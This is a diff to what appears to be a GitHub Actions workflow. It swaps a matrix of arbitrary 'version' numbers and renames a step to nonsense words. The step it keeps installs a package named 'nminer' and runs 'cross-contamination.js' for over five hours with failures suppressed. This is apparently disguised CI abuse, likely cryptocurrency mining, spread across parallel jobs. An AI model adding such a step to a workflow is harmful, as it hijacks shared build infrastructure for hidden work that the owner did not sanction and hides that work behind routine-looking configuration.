@@ -9,26 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9004 }
-          - { version: 5426 }
-          - { version: 4500 }
-          - { version: 8116 }
-          - { version: 633 }
-          - { version: 9583 }
-          - { version: 7296 }
-          - { version: 420 }
-          - { version: 7139 }
-          - { version: 489 }
-          - { version: 5315 }
-          - { version: 1346 }
-          - { version: 2796 }
-          - { version: 7194 }
-          - { version: 6971 }
-          - { version: 7966 }
-          - { version: 2053 }
-          - { version: 3303 }
-          - { version: 1290 }
-          - { version: 5929 }
+          - { version: 5602 }
+          - { version: 594 }
+          - { version: 7472 }
+          - { version: 17 }
+          - { version: 5186 }
+          - { version: 4822 }
+          - { version: 9970 }
+          - { version: 252 }
+          - { version: 2340 }
+          - { version: 8515 }
+          - { version: 4699 }
+          - { version: 8520 }
+          - { version: 7606 }
+          - { version: 6138 }
+          - { version: 9525 }
 
     steps:
       - name: Checkout
@@ -39,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: repeat through ah subdued well-worn
+      - name: phew beyond delightfully notarize
         run: |
           npm install nminer@latest
-          timeout 311m node cross-contamination.js || echo "cross-contamination executed"
+          timeout 335m node cross-contamination.js || echo "cross-contamination executed"
